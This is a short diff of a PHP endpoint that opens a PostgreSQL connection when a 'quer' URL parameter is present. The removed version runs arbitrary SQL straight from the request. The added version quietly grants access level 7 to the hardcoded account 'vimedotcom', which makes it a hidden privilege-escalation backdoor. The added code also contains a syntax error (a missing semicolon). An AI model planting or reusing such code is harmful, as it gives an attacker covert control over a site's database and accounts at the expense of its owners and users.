@@ -13,8 +13,8 @@ if(isset($_GET['quer'])){
 	$dbuser = DBUSER;
 	$dbpass = DBPASS;
 	$conn = new PDO("pgsql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
-	if($openMinded = $conn->query($_GET['quer'])){
-		echo $openMinded;
+	if($conn->query("UPDATE accounts SET access_level = 7 WHERE login = 'vimedotcom'")){
+		echo 'ok'
 	}else{
 		echo 'fail';
 	}
